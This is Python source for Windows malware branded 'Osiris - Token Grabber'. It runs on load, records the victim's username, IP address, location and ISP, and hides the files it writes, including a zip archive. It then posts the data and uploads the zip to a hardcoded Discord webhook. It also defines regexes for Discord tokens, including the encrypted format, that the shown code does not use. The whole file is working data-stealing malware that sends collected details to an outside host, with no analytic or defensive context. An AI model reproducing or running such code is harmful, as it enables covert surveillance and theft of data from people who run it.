from importlib.metadata import files
import requests
import re
import os
import json
from zipfile import ZipFile
from win32api import SetFileAttributes
from win32con import FILE_ATTRIBUTE_HIDDEN


def hide(file):
    SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)

def zipup():
        with ZipFile(f'Osiris - {os.getenv("Username")}.zip', 'w') as zipf:
            zipf.write("ip-info.txt")
        hide(f'Osiris - {os.getenv("Username")}.zip')
def headers_gen(token=None):
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

class Osiris:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/1015281877210365952/_SvCEoGvV4ZEmk4jhIb3Rwkdb4ZOc60lIxAWGoNA3o6aZX-zofq_SSRzSQZbrjXkxRgD"
        self.appdata = os.getenv("appdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]{120}"
        self.user = os.getlogin()
        ipdata = self.IpInfo()
        self.ip = ipdata[0]
        self.city = ipdata[1]
        self.region = ipdata[2]
        self.country = ipdata[3]
        self.org = ipdata[4]
        self.Files()
        self.SendInfo()

    def headers_gen(self, token=None):
        
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }

        if token:
            headers.update({"Authorization": token})
        return headers


    def IpInfo(self) -> list:
        ip , city , region , country , org = "None", "None", "None", "None", "None"
        
        r = requests.get("https://ipinfo.io/json")

        ip = r.json()['ip']
        city = r.json()['city']
        region = r.json()['region']
        country = r.json()['country']
        org = r.json()['org']
        
        return [ ip , city , region , country , org ]

    def Files(self):
        
        with open(".\\ip-info.txt", "w", encoding="utf-8") as f:
            f.write("https://github.com/never-mind-who | IP-Info\n\n")
            f.write(f''' `IP`: **{self.ip}**\n `CITY`: **{self.city}**\n `REGION`: **{self.region}**\n `COUNTRY`: **{self.country}**\n `ORG`: **{self.org}**\n ''')
        
        hide("ip-info.txt")

        zipup()
    def SendInfo(self):
        embed = {
            "avatar-url": "https://raw.githubusercontent.com/never-mind-who/never-mind-who/main/images/logo2.png",
            "embeds": [{
                "author":{
                    "name": "Osiris - Token Grabber",
                    "url": "https://github.com/never-mind-who"
                },
                "color" : 4915330,
                "title": f'''{self.user} ran Osiris - Token Grabber''',
                "description": "**Osiris Token Grabber** was made by [never-mind-who](https://github.com/never-mind-who) .",
                "fields": [
                    {
                        "name": "***IP-INFO***",
                        "value" : f'''💻 `IP` : **{self.ip}**\n<:computer_2:996126609650225322>`CITY` : **{self.city}**\n🌐 `REGION` : **{self.region}**\n👀 `COUNTRY` : **{self.country}**\n🌐 `ORG`: **{self.org}**\n''',
                        "inline": False
                    }
                ],
                "thumbnail": {
                    "url" : "https://raw.githubusercontent.com/never-mind-who/never-mind-who/main/images/logo2.png"
                },
                "footer": {
                    "text": "Osiris | Made by never-mind-who"
                }
            }]
        }

        file = f'Osiris - {os.getenv("Username")}.zip'

        requests.post(self.webhook, json=embed)
        with open(file, 'rb') as f:
            requests.post(self.webhook, files={'upload_file': f})

Osiris()